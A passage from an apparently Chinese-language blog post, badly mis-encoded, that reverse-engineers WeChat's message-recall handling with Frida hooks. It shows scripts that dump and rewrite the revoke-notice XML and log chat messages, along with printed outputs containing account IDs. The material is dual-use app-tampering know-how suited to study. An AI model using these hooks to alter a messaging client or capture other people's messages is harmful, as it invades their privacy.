class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä¿®æ”¹æ’¤å›æç¤ºæ¶ˆæ¯ æ‰“å°jsonè¾“å‡º</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> log_str = <span class="string">&quot;arguments:&quot;</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">arguments</span>.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                log_str += <span class="string">&quot; [&quot;</span> + i + <span class="string">&quot;]&quot;</span> + <span class="variable language_">arguments</span>[i]</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(v0)); <span class="comment">//jsonåŒ–è¾“å‡º GYI</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">  </span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;====================&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;6 ch.b()&quot;</span>, log_str);</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718094764</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163924<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e5211977936516039943<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801938977</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163925</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">679760550</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[],<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">//</span>IYzå†…å®¹</span><br><span class="line"></span><br><span class="line"><span class="operator">&lt;</span>sysmsg type<span class="operator">=</span><span class="string">&quot;revokemsg&quot;</span><span class="operator">&gt;</span></span><br><span class="line">        <span class="symbol">&lt;revokemsg&gt;</span></span><br><span class="line">                <span class="symbol">&lt;session&gt;</span>wxid_0wk809ov49tq22<span class="operator">&lt;</span><span class="operator">/</span>session<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;msgid&gt;</span><span class="number">1632163924</span><span class="operator">&lt;</span><span class="operator">/</span>msgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;newmsgid&gt;</span><span class="number">5211977936516039943</span><span class="operator">&lt;</span><span class="operator">/</span>newmsgid<span class="operator">&gt;</span></span><br><span class="line">                <span class="symbol">&lt;replacemsg&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>[CDATA[<span class="string">&quot;G08aT&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯]]<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">/</span>replacemsg<span class="operator">&gt;</span></span><br><span class="line">        <span class="operator">&lt;</span><span class="operator">/</span>revokemsg<span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>sysmsg<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå°±å¯ä»¥ä¿®æ”¹ä¸€ä¸‹æ’¤å›æ¶ˆæ¯æç¤ºçš„æç¤ºå†…å®¹ï¼ŒæŠŠ<replacemsg>å†…å®¹æ›¿æ¢ä¸€ä¸‹</replacemsg></p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">revoke_msg</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.model.ch&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> v0 = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">arguments</span>[<span class="number">0</span>].<span class="property">gpg</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.cv&quot;</span>));</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">function</span> <span class="title function_">modify_revoke_str</span>(<span class="params">old_revoke_str</span>) &#123;</span><br><span class="line">                <span class="keyword">var</span> message = <span class="string">&quot;å°è¯•æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯&quot;</span>;  <span class="comment">//è¦æ›¿æ¢çš„å†…å®¹</span></span><br><span class="line">                <span class="keyword">var</span> revoke_msg = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(message);</span><br><span class="line">                <span class="keyword">var</span> sub_str = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;]]&gt;&lt;/replacemsg&gt;&quot;</span>)</span><br><span class="line">                <span class="keyword">var</span> index = old_revoke_str.<span class="title function_">indexOf</span>(sub_str);</span><br><span class="line">                <span class="keyword">var</span> new_revoke_str = old_revoke_str.<span class="title function_">substring</span>(<span class="number">0</span>, index - <span class="number">7</span>) + revoke_msg + old_revoke_str.<span class="title function_">substring</span>(index);</span><br><span class="line">                <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.String&quot;</span>).$new(new_revoke_str);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> revoke_xml_obj = <span class="title class_">Java</span>.<span class="title function_">cast</span>(v0.<span class="property">GYI</span>.<span class="property">value</span>, <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.protocal.protobuf.deo&quot;</span>));</span><br><span class="line">    </span><br><span class="line">            revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span> = <span class="title function_">modify_revoke_str</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(revoke_xml_obj.<span class="property">IYz</span>.<span class="property">value</span>);</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">b</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.ak.e$a&#x27;</span>).<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰‹æœºä¸Šæ’¤å›æç¤ºä¹Ÿç¡®å®è¢«ä¿®æ”¹</p><p><img src="/posts/5324751f.htm/image-20240611165936122.png" alt="image-20240611165936122"></p><p>å› ä¸ºèŠå¤©ç•Œé¢å‘ç”Ÿäº†æ”¹å˜ï¼Œæ‰€ä»¥è¿™é‡Œåˆå›åˆ°äº†hook notifyDataSetChangedï¼Œjsonæ‰“å°æœ€åæ¶ˆæ¯</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">notifyDataSetChanged_json</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.a.a&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">notifyDataSetChanged</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;notifyDataSetChanged&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> data = <span class="variable language_">this</span>.<span class="property">LtF</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="comment">//console.log(&quot;Ltf&quot;,data);</span></span><br><span class="line">            <span class="keyword">var</span> data_size = data.<span class="title function_">size</span>();</span><br><span class="line">            <span class="comment">//console.log(&quot;data_size&quot;,data_size);</span></span><br><span class="line">            <span class="keyword">var</span> last_msg=<span class="title class_">Java</span>.<span class="title function_">cast</span>(data.<span class="title function_">get</span>(data_size-<span class="number">1</span>),<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.storage.bz&quot;</span>));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(gson.$new().<span class="title function_">toJson</span>(last_msg));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">notifyDataSetChanged</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°æ’¤å›æ¶ˆæ¯ä¸æ’¤å›æç¤ºï¼Œä»…æœ‰<code>field_content&quot;</code>ã€<code>&quot;field_type&quot;</code>ã€<code>&quot;exe&quot;</code>å­—æ®µä¸ä¸€æ ·ï¼Œå…¶ä¸­æ­£å¸¸æ¶ˆæ¯çš„<code>field_type=1,exe=true</code>ï¼›æ’¤å›æç¤º<code>field_type=10000,exe=false</code></p><p>è¢«æ’¤å›æ¶ˆæ¯å’Œæ’¤å›æ¶ˆæ¯çš„æç¤ºçš„<code>field_msgSvrId</code>å­—æ®µæ˜¯ä¸€æ ·çš„ï¼ŒåŒæ—¶å¯¹åº”ç€æ’¤å›æç¤ºxmlçš„<code>&lt;newmsgid&gt;</code>å­—æ®µ</p><p>å°è¯•ä¿®æ”¹æ’¤å›æç¤ºçš„<code>&lt;newmsgid&gt;</code>å­—æ®µï¼Œå‘ç°æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚ç›´æ¥å°±å˜æˆä¸æ’¤å›äº†ã€‚</p><p>åˆ†æä¸‹ä¸€ä¸ªæ–¹æ³•ï¼š</p><p><code>com.tencent.mm.model.f.a</code>,è·Ÿè¿›</p><p><img src="/posts/5324751f.htm/image-20240611185630564.png" alt="image-20240611185630564"></p><p><img src="/posts/5324751f.htm/image-20240611190920135.png" alt="image-20240611190920135"></p><p>å‚æ•°ä¸€ä¸ºå­—ç¬¦ä¸²Stringï¼Œé€šè¿‡ç¿»é˜…çŸ¥é“æ˜¯ str = M.get(â€œ.sysmsg.$typeâ€)</p><ul><li>å³è·å–çš„æ˜¯xmlä¸­<code>sysmsg</code>çš„<code>type</code>å±æ€§</li><li>æ’¤å›æ¶ˆæ¯å°±ä¸º<code>&quot;revokemsg&quot;</code></li></ul><p>å‚æ•°äºŒæ˜¯ä¸€ä¸ªXMLå†…å®¹è½¬æˆçš„Mapæ•°ç»„</p><p>å‚æ•°ä¸‰ä¿å­˜ç€åŸå§‹çš„æ‰€æœ‰æ•°æ®</p><p>æ‰“å°å‚æ•°ä»£ç å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_fa</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">openClassFile</span>(<span class="string">&#x27;/data/local/tmp/r0gson.dex&#x27;</span>).<span class="title function_">load</span>();</span><br><span class="line">        <span class="keyword">const</span> gson=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.r0ysue.gson.Gson&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.model.f&quot;</span>);</span><br><span class="line">        clazz.<span class="property">a</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[0]:&quot;</span>+<span class="variable language_">arguments</span>[<span class="number">0</span>]);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[1]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">1</span>]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;===============&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;arguments[2]:&quot;</span>+gson.$new().<span class="title function_">toJson</span>(<span class="variable language_">arguments</span>[<span class="number">2</span>]));</span><br><span class="line">            <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>,<span class="variable language_">arguments</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚æ•°å¦‚ä¸‹</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">arguments[<span class="number">0</span>]:revokemsg  <span class="operator">//</span>æ’¤å›æ¶ˆæ¯ ç±»å‹å°±æ˜¯revokemsg</span><br><span class="line"></span><br><span class="line">arguments[<span class="number">1</span>]:&#123;<span class="string">&quot;</span></span><br><span class="line"><span class="string">.sysmsg.revokemsg.newmsgid&quot;</span>:<span class="string">&quot;7006750091473010700&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span><span class="char escape_">\t</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.session&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.$type&quot;</span>:<span class="string">&quot;revokemsg&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.replacemsg&quot;</span>:<span class="string">&quot;<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯&quot;</span>,</span><br><span class="line"><span class="string">&quot;.sysmsg.revokemsg.msgid&quot;</span>:<span class="string">&quot;1632163930&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">==</span><span class="operator">=</span></span><br><span class="line">arguments[<span class="number">2</span>]:&#123;</span><br><span class="line"><span class="string">&quot;gpg&quot;</span>:&#123;<span class="string">&quot;CreateTime&quot;</span>:<span class="number">1718103677</span>,</span><br><span class="line"><span class="string">&quot;GYG&quot;</span>:                        &#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_0wk809ov49tq22&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYH&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;wxid_5yg9b4aw7fo422&quot;</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;GYI&quot;</span>:</span><br><span class="line">&#123;<span class="string">&quot;IYA&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;IYz&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003csysmsg type<span class="char escape_">\u</span>003d<span class="char escape_">\&quot;</span>revokemsg<span class="char escape_">\&quot;</span><span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003crevokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003csession<span class="char escape_">\u</span>003ewxid_0wk809ov49tq22<span class="char escape_">\u</span>003c/session<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cmsgid<span class="char escape_">\u</span>003e1632163930<span class="char escape_">\u</span>003c/msgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cnewmsgid<span class="char escape_">\u</span>003e7006750091473010700<span class="char escape_">\u</span>003c/newmsgid<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003creplacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c![CDATA[<span class="char escape_">\&quot;</span>G08aT<span class="char escape_">\&quot;</span> æ’¤å›äº†ä¸€æ¡æ¶ˆæ¯]]<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/replacemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/revokemsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/sysmsg<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;GYJ&quot;</span>:<span class="number">1</span>,</span><br><span class="line"><span class="string">&quot;GYK&quot;</span>:&#123;<span class="string">&quot;hasBuffer&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hasILen&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;iLen&quot;</span>:<span class="number">0</span>,<span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,<span class="string">&quot;GYL&quot;</span>:<span class="string">&quot;<span class="char escape_">\u</span>003cmsgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003ctmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003cpublisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\u</span>003c/publisher-id<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\t</span><span class="char escape_">\u</span>003c/tmp_node<span class="char escape_">\u</span>003e<span class="char escape_">\n</span><span class="char escape_">\u</span>003c/msgsource<span class="char escape_">\u</span>003e<span class="char escape_">\n</span>&quot;</span>,</span><br><span class="line"><span class="string">&quot;GYN&quot;</span>:<span class="number">801939133</span>,</span><br><span class="line"><span class="string">&quot;nNf&quot;</span>:<span class="number">3</span>,</span><br><span class="line"><span class="string">&quot;vkP&quot;</span>:<span class="number">10002</span>,</span><br><span class="line"><span class="string">&quot;ysP&quot;</span>:<span class="number">1632163931</span>,</span><br><span class="line"><span class="string">&quot;ysR&quot;</span>:<span class="number">3101589936</span>,</span><br><span class="line"><span class="string">&quot;data&quot;</span>:[çœç•¥...],</span><br><span class="line"><span class="string">&quot;includeUnKnownField&quot;</span>:<span class="literal">false</span>&#125;,</span><br><span class="line"><span class="string">&quot;hQb&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQc&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQd&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;hQe&quot;</span>:<span class="number">0</span>,<span class="string">&quot;hQf&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;what&quot;</span>:<span 